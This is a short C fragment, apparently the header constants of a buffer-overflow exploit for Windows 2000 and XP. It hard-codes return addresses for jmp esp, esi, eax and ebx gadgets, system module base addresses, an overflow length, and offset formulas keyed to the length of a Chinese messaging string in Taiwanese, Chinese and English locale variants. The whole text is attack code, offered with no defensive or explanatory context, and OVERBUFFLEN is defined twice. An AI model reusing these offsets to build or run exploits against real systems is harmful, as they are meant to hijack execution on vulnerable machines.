
 #define  eipjmpespwin2000 "\xb7\x0e\xfa\x7f"
 #define  eipretwin2000    "\xb8\x0e\xfa\x7f"

 #define  eipjmpesiwin2000 "\xb9\x11\xfa\x7f"

 #define  eipjmpeaxwin2000 "\x2e\x36\xfc\x7f"
 #define  eipjmpebxwin2000 "\xbc\x36\xfc\x7f"

 #define  eipjmpebxwin2000all "\x33\x75\x18\x00"


 #define   RVAWINXP     0x74ec0000
 #define   RVAWIN2K     0x76810000
 
 #define   OVERBUFFLEN 
 #define   OVERBUFFLEN 0x11ca
 #define   ADDRESS  (OVERBUFFLEN+0x7)/8*8-0x21-2 //tw //0x21=strlen("从 *** test到 test的消息...")
// #define   ADDRESS  (OVERBUFFLEN+0x7)/8*8-0x21   //cn //0x21=strlen("从 *** test到 test的消息...")
// #define   ADDRESS  (OVERBUFFLEN+0x7)/8*8-0x24      //en //0x21=strlen("从 *** test到 test的消息...")
 #define   SENDBUFFLEN ADDRESS+7
